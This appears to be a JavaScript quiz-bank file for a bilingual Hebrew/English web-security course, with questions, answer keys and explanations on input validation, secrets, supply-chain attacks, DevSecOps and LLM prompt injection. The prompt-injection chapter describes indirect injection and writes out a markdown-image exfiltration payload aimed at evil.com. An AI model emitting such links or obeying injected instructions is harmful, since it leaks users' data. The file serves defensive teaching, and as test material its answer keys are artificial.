      explanationEn: "Any JavaScript on the page can read localStorage.\n\nMain Points:\n- If there's XSS, the attacker reads the JWT and sends it to their server\n- Alternative: HttpOnly cookie not accessible to JS, with SameSite CSRF protection",
      qEn: "Why is storing JWT in localStorage dangerous?",
      correctEn: "localStorage is accessible to all JavaScript on the page — an XSS attack can steal the token",
      choicesEn: [
        "localStorage is accessible to all JavaScript on the page — an XSS attack can steal the token",
        "localStorage is limited to 5MB and JWT is too large",
        "localStorage is deleted when closing the browser",
        "localStorage doesn't work in mobile browsers"
      ]
    },
    {
      q: "\u200Fמהי גישת Allowlist ב-input validation ולמה היא עדיפה?",
      correct: "\u200Fמגדירים מה מותר (רק ערכים ספציפיים) — כל דבר אחר נחסם אוטומטית, גם מתקפות לא ידועות",
      choices: [
        "\u200Fמגדירים מה מותר (רק ערכים ספציפיים) — כל דבר אחר נחסם אוטומטית, גם מתקפות לא ידועות",
        "\u200Fמגדירים רשימת IP מותרים לגישה ל־API",
        "\u200Fמגדירים אילו שדות להחזיר בתשובת API",
        "\u200Fמגדירים אילו HTTP methods מותרים"
      ],
      explanation: "‏Denylist (חסימת קלט רע) ניתן לעקוף עם encoding, case variations, unicode.\n\nעיקרי:\n- Allowlist מגדיר בדיוק מה מותר: role: Joi.string().valid('user','editor')\n- כל דבר אחר = שגיאה",
      explanationEn: "Denylist (blocking bad input) can be bypassed with encoding, case variations, unicode.\n\nMain Points:\n- Allowlist defines exactly what's allowed: role: Joi.string().valid('user','editor')\n- Anything else = error",
      qEn: "What is the Allowlist approach in input validation and why is it preferred?",
      correctEn: "Define what is allowed (only specific values) — everything else is automatically blocked, including unknown attacks",
      choicesEn: [
        "Define what is allowed (only specific values) — everything else is automatically blocked, including unknown attacks",
        "Define a list of allowed IPs for API access",
        "Define which fields to return in API responses",
        "Define which HTTP methods are allowed"
      ]
    },
    {
      q: "\u200Fלמה client-side validation לא מספיקה לאבטחת API?",
      correct: "\u200Fתוקף יכול לשלוח בקשות ישירות ל־API (curl/Postman) ולעקוף כל validation בצד הלקוח",
      choices: [
        "\u200Fתוקף יכול לשלוח בקשות ישירות ל־API (curl/Postman) ולעקוף כל validation בצד הלקוח",
        "\u200Fכי JavaScript לא תומך ב-regex מורכב",
        "\u200Fכי הדפדפן לא שומר validation בין דפים",
        "\u200Fכי client-side validation איטית מדי"
      ],
      explanation: "‏כל validation בצד הלקוח הוא UX בלבד — תוקף עוקף אותו בקלות עם curl, Burp Suite, או DevTools.\n\nעיקרי:\n- Server-side validation חובה בכל endpoint\n- Client validation = חוויית משתמש, Server validation = אבטחה",
      explanationEn: "All client-side validation is UX only — an attacker bypasses it easily with curl, Burp Suite, or DevTools.\n\nMain Points:\n- Server-side validation is mandatory on every endpoint\n- Client = UX, Server = security",
      qEn: "Why is client-side validation insufficient for API security?",
      correctEn: "An attacker can send requests directly to the API (curl/Postman) bypassing all client-side validation",
      choicesEn: [
        "An attacker can send requests directly to the API (curl/Postman) bypassing all client-side validation",
        "Because JavaScript doesn't support complex regex",
        "Because the browser doesn't persist validation between pages",
        "Because client-side validation is too slow"
      ]
    }
  ],
  706: [
    {
      q: "\u200Fלמה גישת Allowlist עדיפה על Denylist ב-input validation?",
      correct: "\u200FDenylist ניתן לעקיפה עם encoding ו-unicode. Allowlist חוסם הכל מלבד מה שהוגדר כמותר",
      choices: [
        "\u200FDenylist ניתן לעקיפה עם encoding ו-unicode. Allowlist חוסם הכל מלבד מה שהוגדר כמותר",
        "\u200FAllowlist מהיר יותר בביצועים",
        "\u200FDenylist דורש יותר זיכרון",
        "\u200Fאין הבדל — שניהם מספקים אותה רמת אבטחה"
      ],
      explanation: "‏Denylist מנסה לחסום מתקפות ידועות, אבל תוקפים מוצאים דרכים חדשות (case changes, double encoding, unicode).\n\nעיקרי:\n- Allowlist מגדיר בדיוק מה מותר ודוחה הכל אחר — מגן גם מפני מתקפות שעדיין לא ידועות",
      explanationEn: "Denylist tries to block known attacks, but attackers find new ways (case changes, double encoding, unicode).\n\nMain Points:\n- Allowlist defines exactly what's allowed and rejects everything else — protects against unknown attacks too",
      qEn: "Why is the Allowlist approach preferred over Denylist in input validation?",
      correctEn: "Denylist can be bypassed with encoding and unicode. Allowlist blocks everything except what's defined as allowed",
      choicesEn: [
        "Denylist can be bypassed with encoding and unicode. Allowlist blocks everything except what's defined as allowed",
        "Allowlist is faster in performance",
        "Denylist requires more memory",
        "No difference — both provide the same level of security"
      ]
    },
    {
      q: "\u200Fלמה אסור לשלוח stack trace ללקוח בהודעת שגיאה?",
      correct: "\u200Fstack trace חושף מידע פנימי: נתיבי קבצים, שמות טבלאות, ספריות — מידע שעוזר לתוקף",
      choices: [
        "\u200Fstack trace חושף מידע פנימי: נתיבי קבצים, שמות טבלאות, ספריות — מידע שעוזר לתוקף",
        "\u200Fstack trace גדול מדי ומאט את הרשת",
        "\u200Fstack trace לא קריא למשתמשים רגילים",
        "\u200Fstack trace גורם לדפדפן לקרוס"
      ],
      explanation: "‏stack trace חושף פרטים כמו: באיזו שפה ו-framework כתוב השרת, מבנה ספריות, שמות DB וטבלאות, גרסאות ספריות.\n\nעיקרי:\n- הפתרון: הודעה גנרית + errorId ללקוח, וlog מפורט פנימי",
      explanationEn: "Stack trace reveals details like: server language and framework, directory structure, DB and table names, library versions.\n\nMain Points:\n- Solution: generic message + errorId to client, detailed internal logging",
      qEn: "Why should you never send a stack trace to the client in an error message?",
      correctEn: "Stack trace exposes internal info: file paths, table names, libraries — information that helps attackers",
      choicesEn: [
        "Stack trace exposes internal info: file paths, table names, libraries — information that helps attackers",
        "Stack trace is too large and slows the network",
        "Stack trace is not readable for regular users",
        "Stack trace causes the browser to crash"
      ]
    },
    {
      q: "\u200Fמה הדרך הנכונה לנהל secrets (API keys, סיסמאות DB)?",
      correct: "\u200Fenvironment variables או vault — לעולם לא בקוד מקור או ב-git",
      choices: [
        "\u200Fenvironment variables או vault — לעולם לא בקוד מקור או ב-git",
        "\u200Fלשמור בקובץ config.js מוצפן בתוך הפרויקט",
        "\u200Fלשמור בתגובה (comment) בקוד כדי שלא ירוץ",
        "\u200Fלשמור ב־README.md עם הערה 'סודי'"
      ],
      explanation: "‏secrets ב-git history נשארים לנצח גם אחרי מחיקה.\n\nעיקרי:\n- הפתרון: .env קבצים (ב-.gitignore), או פתרונות כמו HashiCorp Vault, AWS Secrets Manager\n- Secret rotation תקופתי חיוני",
      explanationEn: "Secrets in git history remain forever even after deletion.\n\nMain Points:\n- Solution: .env files (in .gitignore), or tools like HashiCorp Vault, AWS Secrets Manager\n- Periodic secret rotation is essential",
      qEn: "What is the correct way to manage secrets (API keys, DB passwords)?",
      correctEn: "Environment variables or vault — never in source code or git",
      choicesEn: [
        "Environment variables or vault — never in source code or git",
        "Store in an encrypted config.js file inside the project",
        "Store in a code comment so it doesn't run",
        "Store in README.md with a 'secret' note"
      ]
    },
    {
      q: "\u200Fמהי מתקפת Dependency Confusion?",
      correct: "\u200Fתוקף יוצר חבילה ציבורית ב-npm עם אותו שם של חבילה פנימית בארגון, וגרסה גבוהה יותר",
      choices: [
        "\u200Fתוקף יוצר חבילה ציבורית ב-npm עם אותו שם של חבילה פנימית בארגון, וגרסה גבוהה יותר",
        "\u200Fתוקף מתקין חבילות עם שגיאות כתיב (typosquatting)",
        "\u200Fתוקף מוחק חבילות ממאגר npm ציבורי",
        "\u200Fתוקף משנה את תיעוד החבילה כדי להטעות מפתחים"
      ],
      explanation: "‏כשארגון משתמש ב-private registry, npm עלול להעדיף את הגרסה הציבורית הגבוהה יותר ולהתקין את החבילה הזדונית.\n\nעיקרי:\n- הגנה: scoped packages (@company/pkg), .npmrc עם registry ספציפי",
      explanationEn: "When an org uses a private registry, npm may prefer the higher public version and install the malicious package.\n\nMain Points:\n- Defense: scoped packages (@company/pkg), .npmrc with specific registry",
      qEn: "What is a Dependency Confusion attack?",
      correctEn: "Attacker creates a public npm package with the same name as an org's internal package, with a higher version",
      choicesEn: [
        "Attacker creates a public npm package with the same name as an org's internal package, with a higher version",
        "Attacker installs packages with typos (typosquatting)",
        "Attacker deletes packages from public npm registry",
        "Attacker modifies package documentation to mislead developers"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין npm install לבין npm ci ולמה זה חשוב לאבטחה?",
      correct: "\u200Fnpm ci מתקין בדיוק מה שב-lockfile ולא משנה אותו — מבטיח reproducible builds",
      choices: [
        "\u200Fnpm ci מתקין בדיוק מה שב-lockfile ולא משנה אותו — מבטיח reproducible builds",
        "\u200Fnpm ci מתקין רק devDependencies",
        "\u200Fnpm install מהיר יותר ולכן עדיף לפרודקשן",
        "\u200Fאין הבדל אבטחתי — שניהם מתקינים אותו דבר"
      ],
      explanation: "‏npm install יכול לעדכן package-lock.json ולהתקין גרסאות שונות.\n\nעיקרי:\n- npm ci מתקין בדיוק לפי lockfile, מוחק node_modules ישן, ולא משנה את הlock\n- ב־CI/CD חובה npm ci למניעת שינויים לא צפויים",
      explanationEn: "npm install can update package-lock.json and install different versions.\n\nMain Points:\n- npm ci installs exactly from lockfile, deletes old node_modules, and doesn't modify the lock\n- In CI/CD, npm ci is mandatory to prevent unexpected changes",
      qEn: "What is the difference between npm install and npm ci, and why does it matter for security?",
      correctEn: "npm ci installs exactly what's in the lockfile without modifying it — ensures reproducible builds",
      choicesEn: [
        "npm ci installs exactly what's in the lockfile without modifying it — ensures reproducible builds",
        "npm ci only installs devDependencies",
        "npm install is faster so it's preferred for production",
        "No security difference — both install the same thing"
      ]
    }
  ],
  707: [
    {
      q: "\u200Fמהי Prompt Injection ולמה היא דומה ל־SQL Injection?",
      correct: "\u200Fהזרקת הוראות זדוניות ל-prompt של LLM — כמו SQLi, קלט משתמש מעורב עם הוראות מערכת",
      choices: [
        "\u200Fהזרקת הוראות זדוניות ל-prompt של LLM — כמו SQLi, קלט משתמש מעורב עם הוראות מערכת",
        "\u200Fמתקפה שמזריקה וירוסים לתוך מודל AI",
        "\u200Fפריצה לשרתים של OpenAI דרך ה־API",
        "\u200Fשימוש ב־AI ליצירת קוד זדוני"
      ],
      explanation: "‏כמו ב־SQLi שבו קלט משתמש מתערבב עם פקודות SQL, ב־Prompt Injection קלט משתמש מתערבב עם הוראות המערכת של ה־LLM.\n\nעיקרי:\n- ההבדל: ב־SQL יש פתרון (parameterized queries), ב־LLM אין פתרון מושלם",
      explanationEn: "Like SQLi where user input mixes with SQL commands, in Prompt Injection user input mixes with the LLM's system instructions.\n\nMain Points:\n- The difference: SQL has a solution (parameterized queries), LLMs have no perfect solution",
      qEn: "What is Prompt Injection and why is it similar to SQL Injection?",
      correctEn: "Injecting malicious instructions into an LLM's prompt — like SQLi, user input mixed with system instructions",
      choicesEn: [
        "Injecting malicious instructions into an LLM's prompt — like SQLi, user input mixed with system instructions",
        "An attack that injects viruses into an AI model",
        "Hacking OpenAI servers through the API",
        "Using AI to create malicious code"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Direct ל־Indirect Prompt Injection?",
      correct: "\u200FDirect — קלט ישיר מהמשתמש. Indirect — קוד זדוני מוסתר בתוכן חיצוני שה־LLM קורא",
      choices: [
        "\u200FDirect — קלט ישיר מהמשתמש. Indirect — קוד זדוני מוסתר בתוכן חיצוני שה־LLM קורא",
        "\u200FDirect — מתקפה מהירה. Indirect — מתקפה איטית",
        "\u200FDirect — על מודלים קטנים. Indirect — על מודלים גדולים",
        "\u200FDirect — דרך API. Indirect — דרך ממשק ווב"
      ],
      explanation: "‏Indirect מסוכן יותר: הקוד הזדוני מוסתר בדפי ווב, מיילים, או מסמכים כטקסט לבן על רקע לבן.\n\nעיקרי:\n- המשתמש לא רואה את המתקפה, וה־LLM מעבד את ההוראות כחלק מהתוכן",
      explanationEn: "Indirect is more dangerous: malicious code is hidden in web pages, emails, or documents as white text on white background.\n\nMain Points:\n- The user doesn't see the attack, and the LLM processes the instructions as part of the content",
      qEn: "What is the difference between Direct and Indirect Prompt Injection?",
      correctEn: "Direct — direct user input. Indirect — malicious code hidden in external content the LLM reads",
      choicesEn: [
        "Direct — direct user input. Indirect — malicious code hidden in external content the LLM reads",
        "Direct — fast attack. Indirect — slow attack",
        "Direct — on small models. Indirect — on large models",
        "Direct — via API. Indirect — via web interface"
      ]
    },
    {
      q: "\u200Fלמה אי אפשר לפתור Prompt Injection לחלוטין כמו SQL Injection?",
      correct: "\u200Fב־SQL יש הפרדה ברורה בין קוד לנתונים. ב־LLM, הוראות ונתונים הם באותו מדיום — טקסט טבעי",
      choices: [
        "\u200Fב־SQL יש הפרדה ברורה בין קוד לנתונים. ב־LLM, הוראות ונתונים הם באותו מדיום — טקסט טבעי",
        "\u200Fכי LLMs חדשים מדי ועוד לא פיתחו פתרון",
        "\u200Fכי יש יותר מדי שפות שה־LLM תומך בהן",
        "\u200Fכי ה־GPU לא מספיק חזק לבדוק הזרקות"
      ],
      explanation: "‏Parameterized queries מפרידים קוד מנתונים ברמה מבנית.\n\nעיקרי:\n- ב־LLM, system prompt וuser input הם שניהם טקסט\n- המודל לא יכול להבחין באופן מהימן בין 'הוראת מערכת' ל'טקסט שמתחזה להוראה'\n- זו בעיה ארכיטקטורית יסודית",
      explanationEn: "Parameterized queries separate code from data at a structural level.\n\nMain Points:\n- In LLMs, system prompt and user input are both text\n- The model can't reliably distinguish between 'system instruction' and 'text pretending to be an instruction'\n- This is a fundamental architectural problem",
      qEn: "Why can't Prompt Injection be fully solved like SQL Injection?",
      correctEn: "In SQL there's clear separation between code and data. In LLMs, instructions and data are in the same medium — natural text",
      choicesEn: [
        "In SQL there's clear separation between code and data. In LLMs, instructions and data are in the same medium — natural text",
        "Because LLMs are too new and haven't developed a solution yet",
        "Because there are too many languages the LLM supports",
        "Because the GPU isn't powerful enough to check injections"
      ]
    },
    {
      q: "\u200Fמהו Excessive Agency (LLM08) ולמה הוא מסוכן?",
      correct: "\u200Fמתן כלים והרשאות רבים מדי ל־LLM — אם יש prompt injection, הנזק הפוטנציאלי עצום",
      choices: [
        "\u200Fמתן כלים והרשאות רבים מדי ל־LLM — אם יש prompt injection, הנזק הפוטנציאלי עצום",
        "\u200Fשימוש ב־LLM בלי הסכמת המשתמש",
        "\u200Fכשה־LLM מסרב לענות על שאלות לגיטימיות",
        "\u200Fכשה־LLM מייצר תוכן לא מדויק"
      ],
      explanation: "‏AI agent עם גישה ל־DB, מייל, מערכת קבצים — אם תוקף מצליח ב-prompt injection, הוא יכול למחוק נתונים, לשלוח מיילים, לגשת לקבצים.\n\nעיקרי:\n- הפתרון: least privilege — רק הכלים הנחוצים + human-in-the-loop לפעולות קריטיות",
      explanationEn: "An AI agent with access to DB, email, filesystem — if an attacker succeeds in prompt injection, they can delete data, send emails, access files.\n\nMain Points:\n- Solution: least privilege — only necessary tools + human-in-the-loop for critical actions",
      qEn: "What is Excessive Agency (LLM08) and why is it dangerous?",
      correctEn: "Giving too many tools and permissions to the LLM — if prompt injection succeeds, the potential damage is enormous",
      choicesEn: [
        "Giving too many tools and permissions to the LLM — if prompt injection succeeds, the potential damage is enormous",
        "Using an LLM without user consent",
        "When the LLM refuses to answer legitimate questions",
        "When the LLM generates inaccurate content"
      ]
    },
    {
      q: "\u200Fאיך data exfiltration דרך markdown images עובד?",
      correct: "\u200Fה־LLM מייצר תגית תמונה עם URL שמכיל מידע רגיש — הדפדפן שולח GET request עם הנתונים לשרת התוקף",
      choices: [
        "\u200Fה־LLM מייצר תגית תמונה עם URL שמכיל מידע רגיש — הדפדפן שולח GET request עם הנתונים לשרת התוקף",
        "\u200Fהתוקף מעלה תמונה עם וירוס לשרת",
        "\u200Fה־LLM שומר סיסמאות בתוך קבצי תמונה",
        "\u200Fהדפדפן מוריד תמונה שמכילה keylogger"
      ],
      explanation: "‏התוקף גורם ל־LLM לכתוב: ![img](https://evil.com/steal?data=SECRET).\n\nעיקרי:\n- כשהדפדפן מרנדר את ה-markdown, הוא שולח GET ל-evil.com עם ה-data כ-query parameter\n- הגנה: לא לרנדר תמונות מפלט LLM, או allowlist של דומיינים",
      explanationEn: "The attacker causes the LLM to write: ![img](https://evil.com/steal?data=SECRET).\n\nMain Points:\n- When the browser renders the markdown, it sends a GET to evil.com with the data as a query parameter\n- Defense: don't render images from LLM output, or domain allowlist",
      qEn: "How does data exfiltration through markdown images work?",
      correctEn: "The LLM generates an image tag with a URL containing sensitive data — the browser sends a GET request with the data to the attacker's server",
      choicesEn: [
        "The LLM generates an image tag with a URL containing sensitive data — the browser sends a GET request with the data to the attacker's server",
        "The attacker uploads an image with a virus to the server",
        "The LLM saves passwords inside image files",
        "The browser downloads an image containing a keylogger"
      ]
    }
  ],
  708: [
    {
      q: "\u200Fמהו Shift Left Security?",
      correct: "\u200Fהזזת בדיקות אבטחה שמאלה בתהליך הפיתוח — מפרודקשן לכיוון כתיבת הקוד, כי תיקון מוקדם זול יותר",
      choices: [
        "\u200Fהזזת בדיקות אבטחה שמאלה בתהליך הפיתוח — מפרודקשן לכיוון כתיבת הקוד, כי תיקון מוקדם זול יותר",
        "\u200Fשימוש ביד שמאל במקום ימין בעת כתיבת קוד",
        "\u200Fהעברת אחריות האבטחה מהמפתחים ל־DevOps",
        "\u200Fביצוע בדיקות אבטחה רק בסוף הפרויקט"
      ],
      explanation: "‏תיקון באג אבטחה בזמן כתיבת קוד עולה x1, ב־PR עולה x5, ב-staging x10, בפרודקשן x100, אחרי פריצה x1000.\n\nעיקרי:\n- Shift Left = אוטומציה של בדיקות אבטחה ב־CI/CD כדי למצוא בעיות מוקדם",
      explanationEn: "Fixing a security bug during coding costs x1, in PR x5, in staging x10, in production x100, after a breach x1000.\n\nMain Points:\n- Shift Left = automating security checks in CI/CD to find issues early",
      qEn: "What is Shift Left Security?",
      correctEn: "Moving security testing left in the development process — from production toward code writing, because early fixes are cheaper",
      choicesEn: [
        "Moving security testing left in the development process — from production toward code writing, because early fixes are cheaper",
        "Using the left hand instead of right when writing code",
        "Transferring security responsibility from developers to DevOps",
        "Performing security tests only at the end of the project"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין SAST ל־DAST?",
      correct: "\u200FSAST סורק קוד מקור ללא הרצה. DAST בודק אפליקציה רצה על ידי שליחת בקשות זדוניות",
      choices: [
        "\u200FSAST סורק קוד מקור ללא הרצה. DAST בודק אפליקציה רצה על ידי שליחת בקשות זדוניות",
        "\u200FSAST לשפות סטטיות, DAST לשפות דינמיות",
        "\u200FSAST רץ בפרודקשן, DAST רץ בפיתוח",
        "\u200FSAST הוא כלי חינמי, DAST הוא כלי בתשלום"
      ],
      explanation: "‏SAST (Static) מנתח קוד מקור ומוצא דפוסים פגיעים כמו injection ו-hardcoded secrets.\n\nעיקרי:\n- DAST (Dynamic) שולח בקשות זדוניות לאפליקציה רצה ומוצא misconfiguration ובעיות runtime\n- שניהם משלימים זה את זה",
      explanationEn: "SAST (Static) analyzes source code and finds vulnerable patterns like injection and hardcoded secrets.\n\nMain Points:\n- DAST (Dynamic) sends malicious requests to a running application and finds misconfiguration and runtime issues\n- Both complement each other",
      qEn: "What is the difference between SAST and DAST?",
      correctEn: "SAST scans source code without running it. DAST tests a running application by sending malicious requests",
      choicesEn: [
        "SAST scans source code without running it. DAST tests a running application by sending malicious requests",
        "SAST for static languages, DAST for dynamic languages",
        "SAST runs in production, DAST runs in development",
        "SAST is free, DAST is paid"
      ]
    },
    {
      q: "\u200Fלמה חשוב לסרוק את כל ה-git history ולא רק את הקומיט האחרון?",
      correct: "\u200Fסודות שנמחקו בקומיט מאוחר עדיין קיימים בהיסטוריית git — תוקף יכול למצוא אותם",
      choices: [
        "\u200Fסודות שנמחקו בקומיט מאוחר עדיין קיימים בהיסטוריית git — תוקף יכול למצוא אותם",
        "\u200Fכי git שומר רק את הקומיט האחרון בגיבוי",
        "\u200Fכי באגים ישנים עלולים לחזור בגרסאות חדשות",
        "\u200Fכי זה דרישה של GitHub לצורך אבטחת חשבון"
      ],
      explanation: "‏גם אם מחקת API key בקומיט הבא, הוא עדיין נמצא בהיסטוריה.\n\nעיקרי:\n- כלים כמו gitleaks ו-truffleHog סורקים את כל ההיסטוריה\n- אם נמצא secret — חובה לעשות rotation, לא מספיק למחוק",
      explanationEn: "Even if you deleted an API key in the next commit, it still exists in history.\n\nMain Points:\n- Tools like gitleaks and truffleHog scan all history\n- If a secret is found — rotation is mandatory, deletion is not enough",
      qEn: "Why is it important to scan the entire git history, not just the latest commit?",
      correctEn: "Secrets deleted in a later commit still exist in git history — an attacker can find them",
      choicesEn: [
        "Secrets deleted in a later commit still exist in git history — an attacker can find them",
        "Because git only backs up the latest commit",
        "Because old bugs might return in new versions",
        "Because it's a GitHub requirement for account security"
      ]
    },
    {
      q: "\u200Fמהי SCA (Software Composition Analysis)?",
      correct: "\u200Fסריקת dependencies (ספריות צד שלישי) לפגיעויות ידועות מול מסדי CVE",
      choices: [
        "\u200Fסריקת dependencies (ספריות צד שלישי) לפגיעויות ידועות מול מסדי CVE",
        "\u200Fניתוח ביצועים של קוד מקור",
        "\u200Fסריקת קוד לבדיקת עמידה בסטנדרטים",
        "\u200Fבדיקת תאימות בין גרסאות של Node.js"
      ],
      explanation: "‏אפליקציית Node.js ממוצעת משתמשת במאות חבילות.\n\nעיקרי:\n- כלים כמו npm audit, Snyk, ו־Dependabot בודקים כל חבילה מול מסדי CVE ומתריעים על פגיעויות ידועות\n- דוגמה מפורסמת: Log4Shell ב־Log4j",
      explanationEn: "An average Node.js app uses hundreds of packages.\n\nMain Points:\n- Tools like npm audit, Snyk, and Dependabot check each package against CVE databases and alert on known vulnerabilities\n- Famous example: Log4Shell in Log4j",
      qEn: "What is SCA (Software Composition Analysis)?",
      correctEn: "Scanning dependencies (third-party libraries) for known vulnerabilities against CVE databases",
      choicesEn: [
        "Scanning dependencies (third-party libraries) for known vulnerabilities against CVE databases",
        "Analyzing source code performance",
        "Scanning code for standards compliance",
        "Checking compatibility between Node.js versions"
      ]
    },
    {
      q: "\u200Fלמה Dockerfile צריך לרוץ כ-non-root user?",
      correct: "\u200Fאם תוקף מנצל פגיעות, הוא מקבל הרשאות המשתמש — root = שליטה מלאה, non-root = נזק מוגבל",
      choices: [
        "\u200Fאם תוקף מנצל פגיעות, הוא מקבל הרשאות המשתמש — root = שליטה מלאה, non-root = נזק מוגבל",
        "\u200Fכי root user צורך יותר זיכרון",
        "\u200Fכי Docker לא תומך ב-root user בגרסאות חדשות",
        "\u200Fכי non-root user מהיר יותר בהרצת containers"
      ],
      explanation: "‏root ב-container יכול להיות root על ה-host במקרי container escape.\n\nעיקרי:\n- Principle of least privilege — אפליקציה לא צריכה הרשאות root\n- בנוסף, multi-stage builds מקטינים את attack surface",
      explanationEn: "Root in container can be root on host in container escape scenarios.\n\nMain Points:\n- Principle of least privilege — an application doesn't need root permissions\n- Additionally, multi-stage builds reduce the attack surface",
      qEn: "Why should a Dockerfile run as a non-root user?",
      correctEn: "If an attacker exploits a vulnerability, they get the user's permissions — root = full control, non-root = limited damage",
      choicesEn: [
        "If an attacker exploits a vulnerability, they get the user's permissions — root = full control, non-root = limited damage",
        "Because root user consumes more memory",
        "Because Docker doesn't support root user in new versions",
        "Because non-root user is faster at running containers"
      ]
    }
  ]
}

export function getQuizForChapter(chapterId) {
  return (quizBank[chapterId] || []).map(q => ({ ...q, chapterId }))
}

export function getAllQuizQuestions() {
  return Object.entries(quizBank).flatMap(([id, qs]) =>
    qs.map(q => ({ ...q, chapterId: id }))
  )
}
